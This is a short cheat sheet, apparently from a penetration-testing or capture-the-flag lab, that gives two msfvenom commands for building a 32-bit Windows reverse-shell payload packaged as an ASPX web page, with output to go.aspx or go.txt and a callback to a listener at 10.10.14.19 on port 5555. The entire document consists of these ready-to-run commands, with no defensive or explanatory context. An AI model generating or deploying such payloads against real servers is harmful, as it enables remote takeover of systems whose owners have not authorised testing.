## MSFVENOM payload generation commands

### msfvenom 32 bit ASPX reverse shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=5555 --platform windows -a x86 -e generic/none -f aspx -o go.aspx
```

If we want output in txt format, then use below command

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=5555 --platform windows -a x86 -e generic/none -f aspx -o go.txt
```

